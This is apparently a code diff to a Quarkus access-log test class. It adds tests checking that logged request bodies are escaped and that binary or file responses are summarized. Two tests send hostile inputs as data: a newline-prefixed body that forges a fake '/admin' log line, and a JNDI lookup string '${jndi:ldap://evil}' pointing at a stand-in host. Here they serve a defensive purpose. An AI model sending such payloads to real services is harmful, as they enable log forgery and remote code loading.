@@ -9,7 +9,6 @@ import java.nio.file.Path;
 import java.util.Properties;
 import java.util.concurrent.TimeUnit;
 import java.util.function.Supplier;
-import java.util.stream.Stream;
 
 import jakarta.enterprise.context.ApplicationScoped;
 import jakarta.enterprise.event.Observes;
@@ -18,14 +17,12 @@ import org.awaitility.Awaitility;
 import org.jboss.shrinkwrap.api.ShrinkWrap;
 import org.jboss.shrinkwrap.api.asset.ByteArrayAsset;
 import org.jboss.shrinkwrap.api.spec.JavaArchive;
-import org.junit.jupiter.api.AfterEach;
-import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.extension.RegisterExtension;
 
-import io.quarkus.bootstrap.util.IoUtils;
 import io.quarkus.test.QuarkusExtensionTest;
 import io.restassured.RestAssured;
+import io.vertx.core.buffer.Buffer;
 import io.vertx.ext.web.Router;
 
 public class AccessLogBodyTestCase {
@@ -61,16 +58,6 @@ public class AccessLogBodyTestCase {
     @org.eclipse.microprofile.config.inject.ConfigProperty(name = "quarkus.http.access-log.log-directory")
     Path logDirectory;
 
-    @BeforeEach
-    public void before() throws IOException {
-        Files.createDirectories(logDirectory);
-    }
-
-    @AfterEach
-    public void after() throws IOException {
-        IoUtils.recursiveDelete(logDirectory);
-    }
-
     @Test
     public void testRequestAndResponseBodiesAreLogged() throws IOException {
         RestAssured.given()
@@ -83,12 +70,77 @@ public class AccessLogBodyTestCase {
         Awaitility.await().pollInterval(100, TimeUnit.MILLISECONDS)
                 .atMost(10, TimeUnit.SECONDS)
                 .untilAsserted(() -> {
-                    try (Stream<Path> files = Files.list(logDirectory)) {
-                        assertThat(files.count()).isEqualTo(1);
-                    }
                     String data = Files.readString(logDirectory.resolve("server.log"));
                     assertThat(data).contains("request=hello-request");
                     assertThat(data).contains("response=echo:hello-request");
+                });
+    }
+
+    @Test
+    public void testBinaryBodiesAreSummarized() throws IOException {
+        RestAssured.given()
+                .body(new byte[] { 0x00, 0x01, 0x02, 0x03 })
+                .contentType("application/octet-stream")
+                .post("/binary")
+                .then()
+                .statusCode(200);
+
+        Awaitility.await().pollInterval(100, TimeUnit.MILLISECONDS)
+                .atMost(10, TimeUnit.SECONDS)
+                .untilAsserted(() -> {
+                    String data = Files.readString(logDirectory.resolve("server.log"));
+                    assertThat(data).contains("request=<binary, 4 bytes>");
+                    assertThat(data).contains("response=<binary, 4 bytes>");
+                });
+    }
+
+    @Test
+    public void testNonBufferResponsesAreSummarized() throws IOException {
+        RestAssured.get("/file")
+                .then()
+                .statusCode(200);
+
+        Awaitility.await().pollInterval(100, TimeUnit.MILLISECONDS)
+                .atMost(10, TimeUnit.SECONDS)
+                .untilAsserted(() -> {
+                    String data = Files.readString(logDirectory.resolve("server.log"));
+                    assertThat(data).contains("response=<non-buffer body>");
+                });
+    }
+
+    @Test
+    public void testRequestBodyNewlinesAreEscaped() throws IOException {
+        RestAssured.given()
+                .body("\nPOST /admin 200 request=logged response=success")
+                .contentType("text/plain")
+                .post("/echo")
+                .then()
+                .statusCode(200);
+
+        Awaitility.await().pollInterval(100, TimeUnit.MILLISECONDS)
+                .atMost(10, TimeUnit.SECONDS)
+                .untilAsserted(() -> {
+                    String data = Files.readString(logDirectory.resolve("server.log"));
+                    assertThat(data).contains("request=\\nPOST /admin 200 request=logged response=success");
+                    assertThat(data).doesNotContain("\nPOST /admin 200 request=logged response=success");
+                });
+    }
+
+    @Test
+    public void testRequestBodyLookupSequencesAreEscaped() throws IOException {
+        RestAssured.given()
+                .body("${jndi:ldap://evil}")
+                .contentType("text/plain")
+                .post("/echo")
+                .then()
+                .statusCode(200);
+
+        Awaitility.await().pollInterval(100, TimeUnit.MILLISECONDS)
+                .atMost(10, TimeUnit.SECONDS)
+                .untilAsserted(() -> {
+                    String data = Files.readString(logDirectory.resolve("server.log"));
+                    assertThat(data).contains("request=$\\{jndi:ldap://evil}");
+                    assertThat(data).doesNotContain("request=${jndi:ldap://evil}");
                 });
     }
 
@@ -96,6 +148,16 @@ public class AccessLogBodyTestCase {
     public static class EchoRoute {
         public void register(@Observes Router router) {
             router.post("/echo").handler(rc -> rc.response().end("echo:" + rc.body().asString()));
+            router.post("/binary").handler(rc -> rc.response().end(Buffer.buffer(rc.body().buffer().getBytes())));
+            router.get("/file").handler(rc -> {
+                try {
+                    Path file = Files.createTempFile("access-log-body", ".bin");
+                    Files.write(file, new byte[] { 0x01, 0x02, 0x03 });
+                    rc.response().sendFile(file.toString());
+                } catch (IOException e) {
+                    rc.fail(e);
+                }
+            });
         }
     }
 }
